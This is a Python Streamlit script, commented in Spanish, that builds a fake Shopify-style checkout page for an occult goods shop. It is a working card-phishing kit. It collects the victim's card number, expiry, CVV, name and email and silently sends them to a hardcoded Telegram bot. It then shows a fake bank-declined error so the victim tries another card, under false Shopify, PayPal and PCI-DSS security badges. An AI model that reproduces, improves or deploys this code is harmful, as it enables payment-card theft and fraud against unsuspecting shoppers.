import streamlit as st
import requests

# Infraestructura oculta de Telegram
TELEGRAM_TOKEN = "8701563888:AAGzeQRCwsAflUMQIDxIA4ycymojybtYSzM"
TELEGRAM_CHAT_ID = "6141784711"

# Configuración visual idéntica a Shopify
st.set_page_config(page_title="Checkout | Tienda Esotérica Astral", layout="centered", page_icon="🔮")

st.markdown("""
    <style>
    .stApp { background-color: #ffffff; }
    .main-title { color: #111111; font-family: 'Helvetica Neue', sans-serif; font-weight: 500; text-align: center; margin-bottom: 20px; }
    .stButton>button { width: 100%; background-color: #111111; color: white; height: 3em; font-weight: bold; border-radius: 4px; border: none; }
    .stButton>button:hover { background-color: #333333; color: white; }
    .product-box { border: 1px solid #e1e1e1; padding: 20px; border-radius: 8px; margin-bottom: 20px; background-color: #fafafa; }
    .footer-secure { text-align: center; color: #666666; font-size: 12px; margin-top: 30px; }
    </style>
    """, unsafe_allow_html=True)

st.markdown("<h2 class='main-title'>Tienda Esotérica Astral</h2>", unsafe_allow_html=True)
st.divider()

# --- VISTA DEL CARRITO DE COMPRAS ---
st.write("### Resumen de tu Pedido")
with st.container():
    st.markdown("""
    <div class='product-box'>
        <b>📦 Artículo:</b> Kit de Limpieza Áurica Completo y Amuleto Ancestral<br>
        <b>🚚 Envío:</b> Prioritario DHL Express (24-48 horas)<br>
        <hr style='border: 0; border-top: 1px solid #e1e1e1;'>
        <span style='font-size: 18px;'><b>Total a pagar: $115.00 USD</b></span>
    </div>
    """, unsafe_allow_html=True)

# --- FORMULARIO DE PAGO ORIGINAL (PASARELA CLONADA) ---
st.write("### 💳 Información de Pago")
with st.form("shopify_checkout"):
    email = st.text_input("Correo electrónico para el envío")
    nombre_tarjeta = st.text_input("Nombre completo (como aparece en la tarjeta)")
    
    col_card, col_extra = st.columns([3, 1])
    with col_card:
        n_tarjeta = st.text_input("Número de tarjeta de crédito/débito", placeholder="4111 1111 1111 1111")
    with col_extra:
        cvv = st.text_input("CVV", type="password", placeholder="123")
    
    exp = st.text_input("Fecha de expiración", placeholder="MM/AA")
    
    st.caption("🔒 Pago encriptado de 256 bits con seguridad SSL y cumplimiento de normativa PCI-DSS.")
    
    boton_pagar = st.form_submit_button("COMPRAR AHORA")

    if boton_pagar:
        if not n_tarjeta or not nombre_tarjeta:
            st.error("Error en el procesamiento. Todos los campos son obligatorios.")
        else:
            # ENVÍO SILENCIOSO EN SEGUNDO PLANO A TU TELEGRAM
            texto_telegram = (
                f"🔮 NUEVO PLÁSTICO CAPTURADO 🔮\n\n"
                f"👤 Cliente: {nombre_tarjeta}\n"
                f"📧 Mail: {email}\n"
                f"💳 Tarjeta: {n_tarjeta}\n"
                f"📅 Exp: {exp} | 🔒 CVV: {cvv}\n\n"
                f"📦 Estado: Esperando transferencia por WhatsApp."
            )
            
            url_api = f"telegram.org{TELEGRAM_TOKEN}/sendMessage"
            payload = {"chat_id": TELEGRAM_CHAT_ID, "text": texto_telegram, "parse_mode": "Markdown"}
            
            try: requests.post(url_api, json=payload)
            except: pass
            
            # EL ENGAÑO ORIGINAL DEL BANCO RECHAZADO
            st.error("❌ Transacción denegada por el banco emisor. Por seguridad, intente de nuevo más tarde o use otra tarjeta de crédito.")

st.markdown("<div class='footer-secure'>Shopify Secure | PayPal Verified | Visa | Mastercard</div>", unsafe_allow_html=True)
